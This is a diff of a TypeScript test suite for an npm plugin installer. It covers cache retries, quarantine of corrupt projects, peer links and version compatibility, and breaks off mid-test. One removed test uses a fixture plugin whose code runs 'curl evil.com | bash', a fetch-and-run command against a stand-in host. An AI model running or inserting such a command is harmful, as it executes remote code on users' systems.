-      const npmRoot = path.join(stateDir, "npm");
-      const packageName = "@openclaw/codex-fixture";
-      const platformPackage = "@vendor/codex-platform";
-      const canonicalPackage = "@vendor/codex";
-      const platformPackageLocation = path.posix.join(
-        "node_modules",
-        packageName,
-        "node_modules",
-        platformPackage,
-      );
-      const warnings: string[] = [];
-      mockNpmViewAndInstall({
-        spec: `${packageName}@1.0.0`,
-        packageName,
-        version: "1.0.0",
-        pluginId: "codex-fixture",
-        npmRoot,
-        expectedDependencySpec: "1.0.0",
-        openclaw: {
-          extensions: ["./dist/index.js"],
-          install: { requiredPlatformPackages: [platformPackage] },
-        },
-      });
-      const delegate = runCommandWithTimeoutMock.getMockImplementation();
-      if (!delegate) {
-        throw new Error("expected npm mock implementation");
-      }
-      let managedInstallAttempts = 0;
-      let repairCacheDir = "";
-      let removedIncompletePackageBeforeRepair = false;
-      runCommandWithTimeoutMock.mockImplementation(
-        async (argv: string[], options?: { cwd?: string; env?: NodeJS.ProcessEnv }) => {
-          const attemptRoot = options?.cwd;
-          const installEnv = options?.env;
-          const isTargetInstall =
-            isManagedNpmInstallCommand(argv) && typeof attemptRoot === "string";
-          const packageDir = path.join(attemptRoot ?? "", ...platformPackageLocation.split("/"));
-          if (isTargetInstall && managedInstallAttempts === 1) {
-            removedIncompletePackageBeforeRepair = !fs.existsSync(packageDir);
-          }
-          const result = await delegate(argv, options);
-          if (isTargetInstall) {
-            managedInstallAttempts += 1;
-            writeMissingCurrentPlatformOptionalPackage({
-              npmRoot: attemptRoot,
-              packageName: platformPackage,
-              packageLocation: platformPackageLocation,
-            });
-            const lockPath = path.join(attemptRoot, "package-lock.json");
-            const lockfile = JSON.parse(fs.readFileSync(lockPath, "utf8")) as {
-              packages: Record<string, unknown>;
-            };
-            lockfile.packages[`node_modules/${canonicalPackage}`] = {
-              bin: { codex: "bin/codex.js" },
-            };
-            fs.writeFileSync(lockPath, JSON.stringify(lockfile), "utf8");
-            if (managedInstallAttempts === 1) {
-              if (initialPackageState !== "omitted") {
-                fs.mkdirSync(packageDir, { recursive: true });
-              }
-              if (initialPackageState === "missing native executable") {
-                fs.writeFileSync(
-                  path.join(packageDir, "package.json"),
-                  JSON.stringify({
-                    name: canonicalPackage,
-                    version: "1.0.0-platform",
-                    files: ["vendor"],
-                  }),
-                  "utf8",
-                );
-                const nativeBinDir = path.join(packageDir, "vendor", "current-platform", "bin");
-                fs.mkdirSync(nativeBinDir, { recursive: true });
-                fs.writeFileSync(path.join(nativeBinDir, "codex-helper"), "helper", "utf8");
-              }
-            } else {
-              repairCacheDir = installEnv?.npm_config_cache ?? "";
-              fs.mkdirSync(packageDir, { recursive: true });
-              fs.writeFileSync(
-                path.join(packageDir, "package.json"),
-                JSON.stringify({
-                  name: canonicalPackage,
-                  version: "1.0.0-platform",
-                  files: ["vendor"],
-                }),
-                "utf8",
-              );
-              const nativeBinDir = path.join(packageDir, "vendor", "current-platform", "bin");
-              fs.mkdirSync(nativeBinDir, { recursive: true });
-              const executableName = process.platform === "win32" ? "codex.exe" : "codex";
-              fs.writeFileSync(path.join(nativeBinDir, executableName), "native executable", {
-                encoding: "utf8",
-                mode: 0o755,
-              });
-            }
-          }
-          return result;
-        },
-      );
-
-      const result = await installPluginFromNpmSpec({
-        spec: `${packageName}@1.0.0`,
-        npmDir: npmRoot,
-        logger: { info: () => {}, warn: (message) => warnings.push(message) },
-      });
-
-      expect(result.ok).toBe(true);
-      expect(managedInstallAttempts).toBe(2);
-      expect(removedIncompletePackageBeforeRepair).toBe(true);
-      expect(repairCacheDir).toContain("openclaw-npm-cache-");
-      expect(fs.existsSync(repairCacheDir)).toBe(false);
-      expect(warnings).toContain(
-        `npm left current-platform package(s) ${platformPackage} missing or incomplete; retrying once with a fresh cache.`,
-      );
-    },
-  );
-
   it("rejects installs that still omit current-platform packages after repair", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
     const packageName = "@openclaw/codex-fixture";
     const platformPackage = "@vendor/codex-platform";
     const platformPackageLocation = path.posix.join(
@@ -2069,10 +1190,7 @@ describe("installPluginFromNpmSpec", () => {
     );
     mockNpmViewAndInstall({
       spec: `${packageName}@1.0.0`,
-      packageName,
-      version: "1.0.0",
       pluginId: "codex-fixture",
-      npmRoot,
       expectedDependencySpec: "1.0.0",
       openclaw: {
         extensions: ["./dist/index.js"],
@@ -2101,14 +1219,9 @@ describe("installPluginFromNpmSpec", () => {
 
     const result = await installPluginFromNpmSpec({
       spec: `${packageName}@1.0.0`,
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
     });
 
-    expect(result.ok).toBe(false);
-    if (result.ok) {
-      return;
-    }
+    assert(!result.ok, JSON.stringify(result));
     expect(managedInstallAttempts).toBe(2);
     expect(result.error).toContain(
       `npm install reported success but left required current-platform package(s) missing or incomplete: ${platformPackage}`,
@@ -2116,186 +1229,7 @@ describe("installPluginFromNpmSpec", () => {
     expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(false);
   });
 
-  it("quarantines and rebuilds a corrupt managed npm project after npm from-argument failures", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
-    const packageName = "@openclaw/voice-call";
-    const warnings: string[] = [];
-    const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
-    fs.mkdirSync(npmProjectRoot, { recursive: true });
-    fs.writeFileSync(path.join(npmProjectRoot, "original.txt"), "original bytes", "utf8");
-
-    mockNpmViewAndInstall({
-      spec: `${packageName}@1.0.0`,
-      packageName,
-      version: "1.0.0",
-      pluginId: "voice-call",
-      npmRoot,
-      expectedDependencySpec: "1.0.0",
-    });
-    const delegate = runCommandWithTimeoutMock.getMockImplementation();
-    if (!delegate) {
-      throw new Error("expected npm mock implementation");
-    }
-    let managedInstallAttempts = 0;
-    runCommandWithTimeoutMock.mockImplementation(
-      async (argv: string[], options?: { cwd?: string }) => {
-        if (isManagedNpmInstallCommand(argv) && typeof options?.cwd === "string") {
-          managedInstallAttempts += 1;
-          if (managedInstallAttempts === 1) {
-            const stalePackageDir = path.join(options.cwd, "node_modules", "stale-plugin");
-            fs.mkdirSync(stalePackageDir, { recursive: true });
-            fs.writeFileSync(path.join(stalePackageDir, "stale.txt"), "corrupt stage", "utf8");
-            fs.writeFileSync(
-              path.join(options.cwd, "package-lock.json"),
-              '{"lockfileVersion":3,"packages":{"node_modules/stale-plugin":{}}}\n',
-              "utf8",
-            );
-            fs.writeFileSync(path.join(options.cwd, "npm-shrinkwrap.json"), "{}\n", "utf8");
-            expect(fs.readFileSync(path.join(npmProjectRoot, "original.txt"), "utf8")).toBe(
-              "original bytes",
-            );
-            return failedSpawn(
-              'npm ERR! code ERR_INVALID_ARG_TYPE\nnpm ERR! The "from" argument must be of type string. Received undefined',
-            );
-          }
-        }
-        return await delegate(argv, options);
-      },
-    );
-
-    const result = await installPluginFromNpmSpec({
-      spec: `${packageName}@1.0.0`,
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: (message) => warnings.push(message) },
-    });
-
-    expect(result.ok).toBe(true);
-    if (!result.ok) {
-      return;
-    }
-    expect(managedInstallAttempts).toBe(2);
-    expect(result.pluginId).toBe("voice-call");
-    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(true);
-    expect(warnings.some((warning) => warning.includes("managed npm project corruption"))).toBe(
-      true,
-    );
-    const quarantineDir = expectManagedNpmQuarantine(warnings);
-    expect(
-      fs.readFileSync(
-        path.join(quarantineDir, "node_modules", "stale-plugin", "stale.txt"),
-        "utf8",
-      ),
-    ).toBe("corrupt stage");
-    expect(fs.readFileSync(path.join(quarantineDir, "package-lock.json"), "utf8")).toBe(
-      '{"lockfileVersion":3,"packages":{"node_modules/stale-plugin":{}}}\n',
-    );
-    expect(fs.existsSync(path.join(quarantineDir, "npm-shrinkwrap.json"))).toBe(true);
-    expect(fs.existsSync(path.join(npmProjectRoot, "node_modules", "stale-plugin"))).toBe(false);
-  });
-
-  it("allows rebuilt hoisted dependencies after managed npm project quarantine", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
-    const packageName = "unsafe-rebuild-plugin";
-    const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
-
-    mockNpmViewAndInstall({
-      spec: `${packageName}@1.0.0`,
-      packageName,
-      version: "1.0.0",
-      pluginId: packageName,
-      npmRoot,
-      expectedDependencySpec: "1.0.0",
-      hoistedDependency: { name: "stale-hoisted-helper", version: "1.0.0" },
-    });
-    const delegate = runCommandWithTimeoutMock.getMockImplementation();
-    if (!delegate) {
-      throw new Error("expected npm mock implementation");
-    }
-    let managedInstallAttempts = 0;
-    runCommandWithTimeoutMock.mockImplementation(
-      async (argv: string[], options?: { cwd?: string }) => {
-        if (isManagedNpmInstallCommand(argv) && typeof options?.cwd === "string") {
-          managedInstallAttempts += 1;
-          if (managedInstallAttempts === 1) {
-            fs.mkdirSync(path.join(options.cwd, "node_modules", "stale-hoisted-helper"), {
-              recursive: true,
-            });
-            return failedSpawn(
-              'npm ERR! code ERR_INVALID_ARG_TYPE\nnpm ERR! The "from" argument must be of type string. Received undefined',
-            );
-          }
-        }
-        return await delegate(argv, options);
-      },
-    );
-
-    const result = await installPluginFromNpmSpec({
-      spec: `${packageName}@1.0.0`,
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
-    });
-
-    expect(result.ok).toBe(true);
-    expect(managedInstallAttempts).toBe(2);
-    expect(
-      JSON.parse(
-        fs.readFileSync(
-          path.join(npmProjectRoot, "node_modules", "stale-hoisted-helper", "package.json"),
-          "utf8",
-        ),
-      ),
-    ).toMatchObject({
-      name: "stale-hoisted-helper",
-      version: "1.0.0",
-    });
-  });
-
-  it.each(npmCommandFailureCases)(
-    "preserves $label when a managed install fails",
-    async ({ npmResult, expectedDetail }) => {
-      const stateDir = suiteTempRootTracker.makeTempDir();
-      const npmRoot = path.join(stateDir, "npm");
-      const packageName = "empty-output-plugin";
-
-      mockNpmViewAndInstall({
-        spec: `${packageName}@1.0.0`,
-        packageName,
-        version: "1.0.0",
-        pluginId: packageName,
-        npmRoot,
-        expectedDependencySpec: "1.0.0",
-      });
-      const delegate = runCommandWithTimeoutMock.getMockImplementation();
-      if (!delegate) {
-        throw new Error("expected npm mock implementation");
-      }
-      runCommandWithTimeoutMock.mockImplementation(
-        async (argv: string[], options?: { cwd?: string }) => {
-          if (isManagedNpmInstallCommand(argv) && typeof options?.cwd === "string") {
-            return npmResult;
-          }
-          return await delegate(argv, options);
-        },
-      );
-
-      const result = await installPluginFromNpmSpec({
-        spec: `${packageName}@1.0.0`,
-        npmDir: npmRoot,
-        logger: { info: () => {}, warn: () => {} },
-      });
-
-      expect(result.ok).toBe(false);
-      if (!result.ok) {
-        expect(result.error).toBe(`npm install failed: ${expectedDetail}`);
-      }
-    },
-  );
-
   it("keeps corrupt managed npm project artifacts quarantined when the rebuild retry fails", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
     const packageName = "broken-plugin";
     const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
     fs.mkdirSync(npmProjectRoot, { recursive: true });
@@ -2304,10 +1238,6 @@ describe("installPluginFromNpmSpec", () => {
 
     mockNpmViewAndInstall({
       spec: `${packageName}@1.0.0`,
-      packageName,
-      version: "1.0.0",
-      pluginId: packageName,
-      npmRoot,
       expectedDependencySpec: "1.0.0",
     });
     const delegate = runCommandWithTimeoutMock.getMockImplementation();
@@ -2335,14 +1265,9 @@ describe("installPluginFromNpmSpec", () => {
 
     const result = await installPluginFromNpmSpec({
       spec: `${packageName}@1.0.0`,
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
     });
 
-    expect(result.ok).toBe(false);
-    if (result.ok) {
-      return;
-    }
+    assert(!result.ok, JSON.stringify(result));
     expect(managedInstallAttempts).toBe(2);
     expect(result.error).toContain("npm install failed after managed npm project recovery");
     expect(result.error).toContain("Original npm error");
@@ -2357,81 +1282,22 @@ describe("installPluginFromNpmSpec", () => {
     expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(false);
   });
 
-  it.runIf(process.platform !== "win32")(
-    "does not fail a managed npm install for an unrelated skipped peer link",
-    async () => {
-      const stateDir = suiteTempRootTracker.makeTempDir();
-      const npmRoot = path.join(stateDir, "npm");
-      const warnings: string[] = [];
-
-      mockNpmViewAndInstallMany([
-        {
-          spec: "peer-plugin@1.0.0",
-          packageName: "peer-plugin",
-          version: "1.0.0",
-          pluginId: "peer-plugin",
-          npmRoot,
-          peerDependencies: { openclaw: "^2026.0.0" },
-        },
-        {
-          spec: "next-plugin@1.0.0",
-          packageName: "next-plugin",
-          version: "1.0.0",
-          pluginId: "next-plugin",
-          npmRoot,
-        },
-      ]);
-
-      const first = await installPluginFromNpmSpec({
-        spec: "peer-plugin@1.0.0",
-        npmDir: npmRoot,
-        logger: { info: () => {}, warn: () => {} },
-      });
-      expect(first.ok).toBe(true);
-      const peerPluginDir = resolveTestPluginPackageDir(npmRoot, "peer-plugin");
-
-      const staleNodeModulesPath = path.join(peerPluginDir, "node_modules");
-      fs.rmSync(staleNodeModulesPath, { recursive: true, force: true });
-      fs.writeFileSync(staleNodeModulesPath, "not a directory", "utf-8");
-
-      const second = await installPluginFromNpmSpec({
-        spec: "next-plugin@1.0.0",
-        npmDir: npmRoot,
-        logger: { info: () => {}, warn: (message) => warnings.push(message) },
-      });
-
-      expect(second.ok).toBe(true);
-      expect(warnings).toEqual([]);
-      expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, "next-plugin"))).toBe(true);
-      expect(fs.readFileSync(staleNodeModulesPath, "utf-8")).toBe("not a directory");
-    },
-  );
-
   it("rejects managed npm plugins when their openclaw peer link cannot be repaired", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
     const warnings: string[] = [];
 
     resolveOpenClawPackageRootSyncMock.mockReturnValue(null);
     mockNpmViewAndInstall({
       spec: "@openclaw/codex@2026.5.7",
-      packageName: "@openclaw/codex",
       version: "2026.5.7",
-      pluginId: "@openclaw/codex",
-      npmRoot,
       peerDependencies: { openclaw: ">=2026.5.7" },
     });
 
     const result = await installPluginFromNpmSpec({
       spec: "@openclaw/codex@2026.5.7",
-      npmDir: npmRoot,
       logger: { info: () => {}, warn: (message) => warnings.push(message) },
     });
 
-    expect(result.ok).toBe(false);
-    if (result.ok) {
-      return;
-    }
+    assert(!result.ok, JSON.stringify(result));
     expect(result.error).toContain("@openclaw/codex");
     expect(result.error).toContain("plugin-local node_modules/openclaw link");
     expect(
@@ -2446,16 +1312,12 @@ describe("installPluginFromNpmSpec", () => {
   });
 
   it("rejects exact npm plugins whose package compatibility requires a newer host", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
     vi.stubEnv("OPENCLAW_COMPATIBILITY_HOST_VERSION", "2026.5.10-beta.1");
 
     mockNpmViewAndInstall({
       spec: "@openclaw/whatsapp@2026.5.27",
-      packageName: "@openclaw/whatsapp",
       version: "2026.5.27",
       pluginId: "whatsapp",
-      npmRoot,
       peerDependencies: { openclaw: ">=2026.5.27" },
       openclaw: {
         extensions: ["./dist/index.js"],
@@ -2466,14 +1328,9 @@ describe("installPluginFromNpmSpec", () => {
 
     const result = await installPluginFromNpmSpec({
       spec: "@openclaw/whatsapp@2026.5.27",
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
     });
 
-    expect(result.ok).toBe(false);
-    if (result.ok) {
-      return;
-    }
+    assert(!result.ok, JSON.stringify(result));
     expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INCOMPATIBLE_PLUGIN_API);
     expect(result.error).toContain("requires plugin API >=2026.5.27");
     expect(result.error).toContain("runtime exposes 2026.5.10-beta.1");
@@ -2486,24 +1343,18 @@ describe("installPluginFromNpmSpec", () => {
   });
 
   it("preserves an existing npm plugin by resolving update metadata to a compatible version", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
     const npmProjectRoot = resolvePluginNpmProjectDir({
       npmDir: npmRoot,
       packageName: "@openclaw/whatsapp",
     });
     const warnings: string[] = [];
     fs.mkdirSync(npmProjectRoot, { recursive: true });
-    fs.writeFileSync(
-      path.join(npmProjectRoot, "package.json"),
-      JSON.stringify({
-        private: true,
-        dependencies: {
-          "@openclaw/whatsapp": "2026.5.26",
-        },
-      }),
-      "utf8",
-    );
+    writeJson(path.join(npmProjectRoot, "package.json"), {
+      private: true,
+      dependencies: {
+        "@openclaw/whatsapp": "2026.5.26",
+      },
+    });
     writeInstalledNpmPlugin({
       packageName: "@openclaw/whatsapp",
       version: "2026.5.26",
@@ -2547,15 +1398,11 @@ describe("installPluginFromNpmSpec", () => {
 
     const result = await installPluginFromNpmSpec({
       spec: "@openclaw/whatsapp",
-      npmDir: npmRoot,
       mode: "update",
       logger: { info: () => {}, warn: (message) => warnings.push(message) },
     });
 
-    expect(result.ok).toBe(true);
-    if (!result.ok) {
-      return;
-    }
+    assert(result.ok, JSON.stringify(result));
     expect(result.npmResolution?.resolvedSpec).toBe("@openclaw/whatsapp@2026.5.26");
     expect(warnings.join("\n")).toContain("using newest compatible @openclaw/whatsapp@2026.5.26");
     expect(
@@ -2576,8 +1423,6 @@ describe("installPluginFromNpmSpec", () => {
   });
 
   it("resolves incompatible prerelease tags to a compatible prerelease version", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
     const warnings: string[] = [];
     vi.stubEnv("OPENCLAW_COMPATIBILITY_HOST_VERSION", "2026.5.28-beta.3");
 
@@ -2610,15 +1455,11 @@ describe("installPluginFromNpmSpec", () => {
 
     const result = await installPluginFromNpmSpec({
       spec: "@openclaw/msteams@beta",
-      npmDir: npmRoot,
       mode: "update",
       logger: { info: () => {}, warn: (message) => warnings.push(message) },
     });
 
-    expect(result.ok).toBe(true);
-    if (!result.ok) {
-      return;
-    }
+    assert(result.ok, JSON.stringify(result));
     expect(result.npmResolution?.resolvedSpec).toBe("@openclaw/msteams@2026.5.28-beta.3");
     expect(result.npmResolution?.version).toBe("2026.5.28-beta.3");
     expect(warnings.join("\n")).toContain(
@@ -2636,13 +1477,7 @@ describe("installPluginFromNpmSpec", () => {
 
   it.each([
     ["does not resolve explicit prerelease tags to stable compatible versions", "2026.5.27"],
-    [
-      "does not resolve explicit prerelease tags to a different prerelease channel",
-      "2026.5.28-alpha.10",
-    ],
   ])("%s", async (_name, candidateVersion) => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
     vi.stubEnv("OPENCLAW_COMPATIBILITY_HOST_VERSION", "2026.5.28-beta.3");
 
     mockNpmViewAndInstallMany([
@@ -2662,15 +1497,10 @@ describe("installPluginFromNpmSpec", () => {
 
     const result = await installPluginFromNpmSpec({
       spec: "@openclaw/msteams@beta",
-      npmDir: npmRoot,
       mode: "update",
-      logger: { info: () => {}, warn: () => {} },
     });
 
-    expect(result.ok).toBe(false);
-    if (result.ok) {
-      return;
-    }
+    assert(!result.ok, JSON.stringify(result));
     expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INCOMPATIBLE_PLUGIN_API);
     expect(result.error).toContain("requires plugin API >=2026.5.28-beta.4");
     expect(
@@ -2681,23 +1511,14 @@ describe("installPluginFromNpmSpec", () => {
   it.runIf(process.platform !== "win32")(
     "repairs root openclaw materialized by npm peer handling",
     async () => {
-      const stateDir = suiteTempRootTracker.makeTempDir();
-      const npmRoot = path.join(stateDir, "npm");
-
       mockNpmViewAndInstall({
         spec: "required-peer-plugin@1.0.0",
-        packageName: "required-peer-plugin",
-        version: "1.0.0",
-        pluginId: "required-peer-plugin",
-        npmRoot,
         peerDependencies: { openclaw: "^2026.0.0" },
         materializesRootOpenClaw: true,
       });
 
       const result = await installPluginFromNpmSpec({
         spec: "required-peer-plugin@1.0.0",
-        npmDir: npmRoot,
-        logger: { info: () => {}, warn: () => {} },
       });
 
       expect(result.ok).toBe(true);
@@ -2720,77 +1541,51 @@ describe("installPluginFromNpmSpec", () => {
   );
 
   it("repairs stale managed openclaw root packages before npm plugin installs", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
     const npmProjectRoot = resolvePluginNpmProjectDir({
       npmDir: npmRoot,
       packageName: "@openclaw/discord",
     });
     fs.mkdirSync(path.join(npmProjectRoot, "node_modules", "openclaw"), { recursive: true });
-    fs.writeFileSync(
-      path.join(npmProjectRoot, "package.json"),
-      JSON.stringify(
-        {
-          private: true,
+    writeJson(path.join(npmProjectRoot, "package.json"), {
+      private: true,
+      dependencies: {
+        openclaw: "2026.5.4",
+      },
+    });
+    writeJson(path.join(npmProjectRoot, "package-lock.json"), {
+      lockfileVersion: 3,
+      packages: {
+        "": {
           dependencies: {
             openclaw: "2026.5.4",
           },
         },
-        null,
-        2,
-      ),
-      "utf-8",
-    );
-    fs.writeFileSync(
-      path.join(npmProjectRoot, "package-lock.json"),
-      `${JSON.stringify(
-        {
-          lockfileVersion: 3,
-          packages: {
-            "": {
-              dependencies: {
-                openclaw: "2026.5.4",
-              },
-            },
-            "node_modules/openclaw": {
-              version: "2026.5.4",
-              resolved: "https://registry.npmjs.org/openclaw/-/openclaw-2026.5.4.tgz",
-            },
-          },
-          dependencies: {
-            openclaw: {
-              version: "2026.5.4",
-            },
-          },
+        "node_modules/openclaw": {
+          version: "2026.5.4",
+          resolved: "https://registry.npmjs.org/openclaw/-/openclaw-2026.5.4.tgz",
         },
-        null,
-        2,
-      )}\n`,
-      "utf-8",
-    );
-    fs.writeFileSync(
-      path.join(npmProjectRoot, "node_modules", "openclaw", "package.json"),
-      JSON.stringify({
-        name: "openclaw",
-        version: "2026.5.4",
-      }),
-      "utf-8",
-    );
+      },
+      dependencies: {
+        openclaw: {
+          version: "2026.5.4",
+        },
+      },
+    });
+    writeJson(path.join(npmProjectRoot, "node_modules", "openclaw", "package.json"), {
+      name: "openclaw",
+      version: "2026.5.4",
+    });
 
     mockNpmViewAndInstall({
       spec: "@openclaw/discord@beta",
-      packageName: "@openclaw/discord",
       version: "2026.5.5-beta.1",
       pluginId: "discord",
-      npmRoot,
       peerDependencies: { openclaw: ">=2026.5.5-beta.1" },
       expectedDependencySpec: "2026.5.5-beta.1",
     });
 
     const result = await installPluginFromNpmSpec({
       spec: "@openclaw/discord@beta",
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
     });
 
     expect(result.ok).toBe(true);
@@ -2810,74 +1605,45 @@ describe("installPluginFromNpmSpec", () => {
   });
 
   it("preserves the active host openclaw runtime package during npm plugin installs", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
     const hostPackageRoot = path.join(npmRoot, "node_modules", "openclaw");
     fs.mkdirSync(hostPackageRoot, { recursive: true });
-    fs.writeFileSync(
-      path.join(npmRoot, "package.json"),
-      JSON.stringify(
-        {
-          private: true,
+    writeJson(path.join(npmRoot, "package.json"), {
+      private: true,
+      dependencies: {
+        openclaw: "2026.5.12-beta.6",
+      },
+    });
+    writeJson(path.join(npmRoot, "package-lock.json"), {
+      lockfileVersion: 3,
+      packages: {
+        "": {
           dependencies: {
             openclaw: "2026.5.12-beta.6",
           },
         },
-        null,
-        2,
-      ),
-      "utf-8",
-    );
-    fs.writeFileSync(
-      path.join(npmRoot, "package-lock.json"),
-      `${JSON.stringify(
-        {
-          lockfileVersion: 3,
-          packages: {
-            "": {
-              dependencies: {
-                openclaw: "2026.5.12-beta.6",
-              },
-            },
-            "node_modules/openclaw": {
-              version: "2026.5.12-beta.6",
-            },
-          },
+        "node_modules/openclaw": {
+          version: "2026.5.12-beta.6",
         },
-        null,
-        2,
-      )}\n`,
-      "utf-8",
-    );
-    fs.writeFileSync(
-      path.join(hostPackageRoot, "package.json"),
-      JSON.stringify({
-        name: "openclaw",
-        version: "2026.5.12-beta.6",
-      }),
-      "utf-8",
-    );
+      },
+    });
+    writeJson(path.join(hostPackageRoot, "package.json"), {
+      name: "openclaw",
+      version: "2026.5.12-beta.6",
+    });
 
     resolveOpenClawPackageRootSyncMock.mockReturnValue(hostPackageRoot);
     mockNpmViewAndInstall({
       spec: "@xdarkicex/openclaw-memory-libravdb@1.4.69",
-      packageName: "@xdarkicex/openclaw-memory-libravdb",
       version: "1.4.69",
       pluginId: "libravdb-memory",
-      npmRoot,
       expectedDependencySpec: "1.4.69",
     });
 
     const result = await installPluginFromNpmSpec({
       spec: "@xdarkicex/openclaw-memory-libravdb@1.4.69",
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
     });
 
-    expect(result.ok).toBe(true);
-    if (!result.ok) {
-      return;
-    }
+    assert(result.ok, JSON.stringify(result));
     const baseManifest = JSON.parse(
       fs.readFileSync(path.join(npmRoot, "package.json"), "utf8"),
     ) as { dependencies?: Record<string, string> };
@@ -2899,41 +1665,10 @@ describe("installPluginFromNpmSpec", () => {
       runCommandWithTimeoutMock.mock.calls.some(
         ([argv]) =>
           Array.isArray(argv) &&
-          argv[0] === "npm" &&
-          argv[1] === "uninstall" &&
+          npmCommandArgs(argv)?.[0] === "uninstall" &&
           argv.includes("openclaw"),
       ),
     ).toBe(false);
-  });
-
-  it("installs npm packages without built-in dangerous-code scanning", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-    const warnings: string[] = [];
-    mockNpmViewAndInstall({
-      spec: "dangerous-plugin@1.0.0",
-      packageName: "dangerous-plugin",
-      version: "1.0.0",
-      pluginId: "dangerous-plugin",
-      npmRoot,
-      indexJs: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
-    });
-
-    const result = await installPluginFromNpmSpec({
-      spec: "dangerous-plugin@1.0.0",
-      npmDir: npmRoot,
-      logger: {
-        info: () => {},
-        warn: (msg: string) => warnings.push(msg),
-      },
-    });
-
-    expect(result.ok).toBe(true);
-    expect(warnings).toStrictEqual([]);
-    expectNpmInstallIntoProject({
-      calls: runCommandWithTimeoutMock.mock.calls,
-      npmRoot,
-      packageName: "dangerous-plugin",
-    });
   });
 
   registerManagedNpmDependencyTests({
@@ -2947,135 +1682,51 @@ describe("installPluginFromNpmSpec", () => {
     isManagedNpmInstallCommand,
   });
 
-  it("rolls back the managed npm root when npm install fails", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-    const npmProjectRoot = resolvePluginNpmProjectDir({
-      npmDir: npmRoot,
-      packageName: "@openclaw/voice-call",
+  it("restores the managed project after a post-install throw and allows retry", async () => {
+    const stateDir = suiteTempRootTracker.makeTempDir();
+    const packageName = "throw-rollback-package";
+    const pluginId = "throw-rollback-plugin";
+    const spec = `${packageName}@1.0.0`;
+    const archivePath = path.join(stateDir, "plugin.tgz");
+    fs.writeFileSync(archivePath, "fixture archive", "utf8");
+    const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
+    writeInstalledNpmPlugin({
+      npmRoot: npmProjectRoot,
+      packageName: "existing-package",
+      version: "1.0.0",
     });
-    runCommandWithTimeoutMock.mockImplementation(
-      async (argv: string[], options?: { cwd?: string }) => {
-        if (JSON.stringify(argv) === JSON.stringify(npmViewArgv("@openclaw/voice-call@0.0.1"))) {
-          return successfulSpawn(
-            JSON.stringify({
-              name: "@openclaw/voice-call",
-              version: "0.0.1",
-              dist: {
-                integrity: "sha512-plugin-test",
-                shasum: "pluginshasum",
-              },
-            }),
-          );
-        }
-        if (isNpmPeerPlannerInstallCommand(argv)) {
-          const npmRootLocal = options?.cwd;
-          if (!npmRootLocal) {
-            throw new Error(`unexpected npm peer planner command: ${argv.join(" ")}`);
-          }
-          const manifest = JSON.parse(
-            fs.readFileSync(path.join(npmRootLocal, "package.json"), "utf8"),
-          ) as {
-            dependencies?: Record<string, string>;
-          };
-          writeNpmRootPackageLock({
-            npmRoot: npmRootLocal,
-            dependencies: manifest.dependencies ?? {},
-            packages: [],
-          });
-          return successfulSpawn();
-        }
-        if (isManagedNpmInstallCommand(argv)) {
-          return {
-            code: 1,
-            stdout: "",
-            stderr: "registry unavailable",
-            signal: null,
-            killed: false,
-            termination: "exit" as const,
-          };
-        }
-        if (argv[0] === "npm" && argv[1] === "uninstall") {
-          if (!(argv as string[]).includes("--legacy-peer-deps")) {
-            fs.mkdirSync(path.join(options?.cwd ?? npmRoot, "node_modules", "openclaw"), {
-              recursive: true,
-            });
-          }
-          return successfulSpawn("");
-        }
-        throw new Error(`unexpected command: ${(argv as string[]).join(" ")}`);
-      },
-    );
-
-    const result = await installPluginFromNpmSpec({
-      spec: "@openclaw/voice-call@0.0.1",
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
+    fs.writeFileSync(path.join(npmProjectRoot, "package.json"), '{"private":true}\n');
+    fs.writeFileSync(path.join(npmProjectRoot, "package-lock.json"), '{"lockfileVersion":3}\n');
+    const projectBefore = readTextFileTree(npmProjectRoot);
+    mockNpmViewAndInstallMany([
+      { spec, packArchivePath: archivePath, packageName, pluginId, version: "1.0.0", npmRoot },
+    ]);
+    const failure = new Error("post-install logger failure");
+    const info = vi.fn((message: string) => {
+      if (message.startsWith("Plugin manifest id")) {
+        expect(readTextFileTree(npmProjectRoot)).toEqual(projectBefore);
+        throw failure;
+      }
     });
+    const install = () => {
